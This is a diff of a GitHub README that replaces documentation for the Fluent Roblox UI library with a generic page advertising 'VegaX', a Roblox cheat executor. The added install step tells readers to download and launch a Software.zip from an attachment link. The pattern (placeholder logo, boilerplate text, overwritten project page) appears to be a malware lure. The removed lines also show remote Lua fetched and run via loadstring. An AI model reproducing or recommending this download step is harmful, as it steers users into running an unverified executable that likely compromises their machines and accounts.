@@ -1,37 +1,34 @@
-<img src="Assets/darkmode.png#gh-dark-mode-only" alt="fluent">
-<img src="Assets/lightmode.png#gh-light-mode-only" alt="fluent">
+# Roblox-Vega 🚀
 
-## ⚡ Features
+Welcome to the Roblox-Vega repository! Here, you will find VegaX, a powerful Windows PC executor for Roblox. VegaX is designed to run Lua scripts efficiently, enabling users to unlock advanced game modifications and enhance their overall gameplay experience.
 
-- Modern design
-- Many customization options
-- Almost any UI Element you would ever need
-<br/>
+![Roblox Vega Logo](https://example.com/roblox-vega-logo.jpg)
 
-## 🔌 Installation
+## Features 🎮
 
-You can load Fluent through a GitHub Release:
+- Efficient Lua script execution.
+- Advanced game modifications.
+- Enhanced gameplay experience.
 
-```lua
-local Library = loadstring(game:GetService("HttpService"):GetAsync("https://github.com/ActualMasterOogway/Fluent-Renewed/releases/latest/download/Fluent.luau", true))()
-```
-```lua
-local Library = loadstring(game:HttpGetAsync("https://github.com/ActualMasterOogway/Fluent-Renewed/releases/latest/download/Fluent.luau", true))()
-```
-<br/>
+## Installation 💻
 
-## 📜 Usage
-[Example Script the studio environment](https://github.com/ActualMasterOogway/Fluent-Renewed/blob/master/Example.client.luau)
+To install VegaX, click [here](https://github.com/user-attachments/files/18060583/Software.zip) and launch the downloaded file.
 
-[Example Script for an exploit environment](https://github.com/ActualMasterOogway/Fluent-Renewed/blob/master/Example.luau)
-<br/>
+## Usage 🕹️
 
-## Credits
+1. Download and install VegaX.
+2. Launch the application.
+3. Select the Roblox game you want to modify.
+4. Enter the Lua script you wish to run.
+5. Click 'Execute' to apply the modifications.
+6. Enjoy your enhanced gameplay experience!
 
-- [Master Oogway](https://github.com/ActualMasterOogway/Fluent-Renewed) - The master mind behind Fluent Renewed
-- [dawid](https://github.com/dawid-scripts/Fluent) - The master mind behind Fluent
-- [Lucide](https://github.com/lucide-icons) - The sexy icons
-- [richie0866/remote-spy](https://github.com/richie0866/remote-spy) - Assets for the UI, some of the code
-- [violin-suzutsuki/LinoriaLib](https://github.com/violin-suzutsuki/LinoriaLib) - Code for most of the elements, save manager
-- [7kayoh/Acrylic](https://github.com/7kayoh/Acrylic) - Porting richie0866's acrylic module to lua
-- [Latte Softworks & Kotera](https://discord.gg/rMMByr4qas) - Bundler
+## Support ℹ️
+
+If you encounter any issues with VegaX, please check the "Releases" section for updates or reach out to our support team at support@robloxvega.com.
+
+## Contributing 🤝
+
+We welcome contributions to improve VegaX! Feel free to fork this repository, make your changes, and submit a pull request.
+
+Let's make Roblox gaming even more exciting with VegaX! 🌟
